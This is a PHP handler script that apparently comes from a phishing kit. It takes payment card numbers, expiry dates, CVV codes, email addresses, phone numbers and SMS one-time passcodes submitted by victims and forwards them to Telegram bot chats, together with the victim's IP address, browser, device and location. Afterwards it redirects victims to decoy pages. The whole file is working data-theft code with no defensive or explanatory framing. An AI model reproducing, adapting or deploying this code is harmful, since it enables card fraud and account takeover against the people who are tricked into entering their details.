<?php 
session_start();
error_reporting(0);

include 'config.php';
include '../includes/functions.php';

$ip = $_SERVER['REMOTE_ADDR'];


function hit($link){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $link);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	return curl_exec($c);
	curl_close($c);
}


if ($_POST['step'] == 'notp'){	
	$text = urlencode("
    🇿🇦 SMS - $ip
    ---------------------------
    SMS ONE : ".$_POST['sms']."
    ---------------------------
    IP : $ip
    Browser : ".$_SESSION['browser']."
    Device : ".$_SESSION['device']."
    Country : ".$_SESSION['country']."
    City : ".$_SESSION['city']."
    Date : ".date("Y-m-d H:i:s")
    );
	
	
	foreach($chat_ids as $id){
		$link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
		hit($link);
	}
	
		header("location: ../actiont.php");
}


else if ($_POST['step'] == 'notpt'){	
	$text = urlencode("
    🇿🇦 SMS - $ip
    ---------------------------
    SMS TWO : ".$_POST['sms']."
    ---------------------------
    IP : $ip
    Browser : ".$_SESSION['browser']."
    Device : ".$_SESSION['device']."
    Country : ".$_SESSION['country']."
    City : ".$_SESSION['city']."
    Date : ".date("Y-m-d H:i:s")
    );
	
	
	foreach($chat_ids as $id){
		$link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
		hit($link);
	}
	
		header("Refresh: 5; URL=../success.php");
		
}
	
	
else if ($_POST['step'] == 'update'){
    $bin = cardinfo($_POST['CSVS-no']);
    $text = urlencode("
    🇿🇦 CARD INFO - $ip
    ---------------------------
    Email : ".$_POST['email']."
    PHONE : ".$_POST['Phone']."
    CC : ".str_replace(' ', '', $_POST['CSVS-no'])."
    EXP : ".$_POST['MM/YY-no']."
    CVV : ".$_POST['Ss-no']."
    
    ".$bin->bank->name."
    ".$bin->scheme."
    ".$bin->type."
    ".$bin->category."
    ---------------------------
    IP : $ip
    Browser : ".$_SESSION['browser']."
    Device : ".$_SESSION['device']."
    Country : ".$_SESSION['country']."
    City : ".$_SESSION['city']."
    Date : ".date("Y-m-d H:i:s")
    );
	
	
	foreach($chat_ids as $id){
		$link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
		hit($link);
	}
	
    header("location: ../action.php");
}



?>